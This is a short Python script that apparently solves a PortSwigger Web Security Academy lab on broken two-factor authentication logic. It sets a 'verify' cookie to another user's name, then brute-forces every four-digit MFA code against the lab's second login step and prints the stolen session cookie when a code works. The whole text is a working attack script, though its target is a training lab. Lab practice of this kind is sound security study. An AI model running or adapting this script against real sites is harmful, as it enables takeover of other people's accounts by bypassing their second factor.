# https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic


import requests


url = 'https://....web-security-academy.net/login2'


s = requests.Session()

s.cookies.set('verify', 'carlos')
r = s.get(url=url)


for i in range(10000):

    body = {
        'mfa-code': f'{i:04d}'
    }
    r = s.post(url=url, data=body)
    print(body)
    
    if 'Incorrect security code' not in r.text:
        print(f'{i:04d}')
        print(s.cookies.get('session'))
        break
